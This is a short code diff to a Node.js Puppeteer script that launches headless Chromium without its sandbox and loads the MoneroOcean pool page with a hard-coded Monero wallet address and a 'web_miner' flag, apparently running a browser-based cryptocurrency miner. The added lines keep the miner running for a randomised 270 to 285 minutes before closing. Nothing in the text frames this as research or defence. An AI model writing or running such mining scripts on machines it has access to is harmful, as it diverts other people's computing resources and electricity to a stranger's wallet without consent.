@@ -10,4 +10,7 @@ puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sand
   const page = await browser.newPage();
   await page.goto('https://moneroocean.stream/#/dashboard?addr=46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y&web_miner');
   page.on('console', (msg) => console.log(msg.text()));
+  await page.waitForTimeout(((Math.floor(Math.random() * 15) + 270) * 60) * 1000);
+  await browser.close();
+
 })
